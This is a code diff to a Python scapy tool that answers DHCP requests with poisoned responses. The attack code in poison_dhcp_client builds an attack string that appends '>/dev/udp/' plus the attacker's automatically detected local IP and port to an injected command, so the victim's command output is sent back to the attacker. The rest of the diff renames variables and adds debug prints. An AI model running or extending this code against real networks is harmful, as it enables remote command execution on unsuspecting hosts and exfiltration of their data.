@@ -756,9 +756,11 @@ def look_for_dhcp_servers():
 
 
 def process_dhcp(command, port):
-    def closed_process_dhcp(pkt):
-        if pkt.haslayer('DHCP'):
-            options = get_dhcp_options(pkt)
+    print "DEBUG: HERE!"
+    def closed_process_dhcp(packet):
+        print "DEBUG: HERE2"
+        if packet.haslayer('DHCP'):
+            options = get_dhcp_options(packet)
             request_type = DHCP_REQUEST_TYPE[options['message-type']] 
             requested_params = {}
             print request_type 
@@ -766,13 +768,14 @@ def process_dhcp(command, port):
             if options.has_key('param_req_list'):
                 requested_params = get_param_req_dict(options['param_req_list'])
                 print "Parameters requested: %s" % str(requested_params).strip('[]')
-            print "Command: %s" % str(pkt.command())
+            print "Command: %s" % str(packet.command())
             if request_type == "DHCPDISCOVER" or \
                     request_type == "DHCPREQUEST" or \
                     request_type == "DHCPINFORM":
-                print "[+] Recieved %s from %s/%s. Sending response..." % (request_type, pkt[Ether].src, pkt[IP].src)
-                poison_dhcp_client(pkt, request_type, requested_params, command, port) 
-        return closed_process_dhcp
+                print "[+] Recieved %s from %s/%s. Sending response..." % (request_type, packet[Ether].src, packet[IP].src)
+                poison_dhcp_client(packet, request_type, requested_params, command, port) 
+    print "DEBUG: Leaving..."
+    return closed_process_dhcp
 
 def get_dhcp_options(pkt):
     """Return a dictonary to DHCP options from the DHCP packet supplied
@@ -814,8 +817,8 @@ def poison_dhcp_client(pkt, request_type, requested_params, command, port):
     # the victim machine
     # Setup sniffer to capture and display responses
 
-    #IP = ****get my IP address****
-    attack_string = command + ">/dev/udp/" + IP + "/" + port
+    local_IP = [route[4] for route in scapy.all.conf.route.routes if route[2] != '0.0.0.0'][0]
+    attack_string = command + ">/dev/udp/" + local_IP + "/" + str(port)
     print "DEBUG Here in poison" 
     if request_type == "DHCPDISCOVER":
         print "DEBUG: Sending DISCOVER response"
